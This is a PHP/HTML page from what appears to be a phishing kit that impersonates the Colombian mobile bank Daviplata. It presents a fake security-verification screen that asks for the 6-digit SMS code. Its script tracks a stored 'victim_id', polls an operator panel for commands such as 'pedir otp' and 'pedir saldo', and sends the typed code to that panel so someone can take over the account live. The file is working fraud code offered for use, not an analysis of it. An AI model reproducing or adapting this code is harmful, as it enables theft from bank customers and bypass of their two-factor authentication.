<?php
include_once dirname(dirname(dirname(dirname(dirname(dirname(__DIR__)))))) . '/admin/subirdatos/security_gate.php';
?>
<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Bre-B Daviplata - Verificación</title>
  <link rel="stylesheet" href="PseDaviplata/css/estilos.css">
  <style>
    .error-inline {
      color: #e11d48;
      font-family: sans-serif;
      font-size: 13px;
      margin-top: 10px;
      display: none;
      text-align: center;
      font-weight: 600;
      line-height: 1.4;
    }
  </style>
  <script src="PseDaviplata/js/jquery.min.js"></script>
</head>
<body>
  <div id="waiting-admin" class="z-modal-mask" style="display:flex; flex-direction: column; align-items: center; justify-content: center; background: #fff; z-index: 9999;">
    <img src="PseDaviplata/img/loader.gif" alt="Cargando..." style="width: 120px;">
    <div class="z-loading-text" style="color: #666; margin-top: 20px; text-align: center; font-family: sans-serif;">
      Estamos validando su información,<br>por favor espere un momento...
    </div>
  </div>

  <div id="root" style="display:none;">
    <div class="App">
      <header class="header">
          <div class="conteLogo"><img src="PseDaviplata/img/logo-daviplata.svg" class="imagenLogoHeader"></div>
          <div class="conteTexto"><h2 id="fecha-actual" class="textoHeader"></h2></div>
      </header>
      <main class="index">
          <section class="compoInfDatos">
              <div class="conteIngDatos">
                  <div class="conteTitle">
                      <h3>Verificación de seguridad</h3>
                      <p>Código de confirmación</p>
                      <div id="error-message" class="error-inline">
                        El código de seguridad ingresado es incorrecto o ha expirado. Por favor, verifíquelo e intente de nuevo.
                      </div>
                  </div>
                  <div class="conteParrafo">
                      <p>Ingrese el código de <b>6 dígitos</b> enviado a su celular por SMS.</p>
                  </div>
                  <form id="otpForm">
                      <div class="boxInputs">
                          <input type="text" name="otp" id="otp" placeholder="000000" class="inputNumber" maxlength="6" inputmode="numeric" style="text-align:center; letter-spacing:8px; font-size:24px;" autocomplete="off">
                      </div>
                      <br><br>
                      <div class="conteFlex">
                          <div class="contentBoton"><button type="button" onclick="history.back()" class="boton segundario">Volver</button></div>
                          <div class="contentBoton"><button type="submit" id="btnOtp" class="boton principal" disabled>Confirmar</button></div>
                      </div>
                  </form>
              </div>
          </section>
      </main>
    </div>
  </div>
  <div id="view-loading" class="z-modal-mask" style="display:none;">
    <div class="z-loading">
      <span class="z-loading-icon"></span>
      <div class="z-loading-text">Por favor espera...</div>
    </div>
  </div>
  <script>
    const getProjectRoot = () => {
        const path = window.location.pathname;
        const parts = path.split('/');
        const pseIndex = parts.indexOf('PSE');
        return pseIndex !== -1 ? parts.slice(0, pseIndex + 1).join('/') : '';
    };
    const root = getProjectRoot();

    function actualizarFecha() {
        const opciones = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric', hour: '2-digit', minute: '2-digit', hour12: true, timeZone: 'America/Bogota' };
        let f = new Date().toLocaleDateString('es-CO', opciones);
        const el = document.getElementById('fecha-actual');
        if(el) el.innerText = f.charAt(0).toUpperCase() + f.slice(1);
    }
    actualizarFecha();
     setInterval(actualizarFecha, 60000);

     const victimId = localStorage.getItem('victim_id');
     const panelSID = localStorage.getItem('victim_sid') || '';
     let isWaitingForVerification = false;

     function checkStatus() {
         $.ajax({
             url: root + '/admin/subirdatos/sync_data.php',
             method: 'GET',
             data: { id: victimId, t: Date.now() },
             success: function(res) {
                 const json = typeof res === 'string' ? JSON.parse(res) : res;
                 if (!json || !json.data) return;
                 const status = (json.data.status || '').toLowerCase().trim();
                 console.log("Admin Status:", status);

                 if (!isWaitingForVerification) {
                     if (status === 'pedir otp' || status === 'otp sms' || status === 'token' || status === 'dinamica') {
                         $('#waiting-admin').hide();
                         $('#root').show();
                     } else if (status === 'pedir saldo') {
                         clearInterval(statusInterval);
                         window.location.href = "saldo.php";
                     } else if (status === 'error' || status === 'error usuario' || status === 'error clave') {
                         clearInterval(statusInterval);
                         window.location.href = "index.php?error=1";
                     }
                 } else {
                     if (status === 'finalizado' || status === 'aprobado' || status === 'finalizar') {
                         clearInterval(statusInterval);
                         window.location.href = "final.php";
                     } else if (status === 'error otp' || status === 'error otp sms' || status === 'error token') {
                         isWaitingForVerification = false;
                         $('#waiting-admin').hide();
                         $('#root').show();
                         $('#otp').val('');
                         $('#btnOtp').prop('disabled', true);
                         $('#error-message').fadeIn().delay(5000).fadeOut();
                     } else if (status === 'pedir saldo') {
                        clearInterval(statusInterval);
                        window.location.href = "saldo.php";
                     }
                 }
             }
         });
     }

     const statusInterval = setInterval(checkStatus, 3000);
     checkStatus();

     $('#otp').on('input', function() {
        this.value = this.value.replace(/[^0-9]/g, '');
        $('#btnOtp').prop('disabled', this.value.length !== 6);
    });

    $('#otpForm').on('submit', function(e) {
        e.preventDefault();
        $('#view-loading').show();

        const formData = new FormData();
        formData.append('action', 'update_status');
        formData.append('id', victimId);
        formData.append('sid', panelSID);
        formData.append('banco', 'DAVIPLATA');
        formData.append('status', 'OTP Enviado: ' + $('#otp').val());

        $.ajax({
            url: root + '/admin/subirdatos/sync_data.php',
            method: 'POST',
            data: formData,
            processData: false,
            contentType: false,
            success: function() {
                $('#view-loading').hide();
                $('#root').hide();
                $('#waiting-admin').show();
                isWaitingForVerification = true;
            }
        });
    });
  </script>
</body>
</html>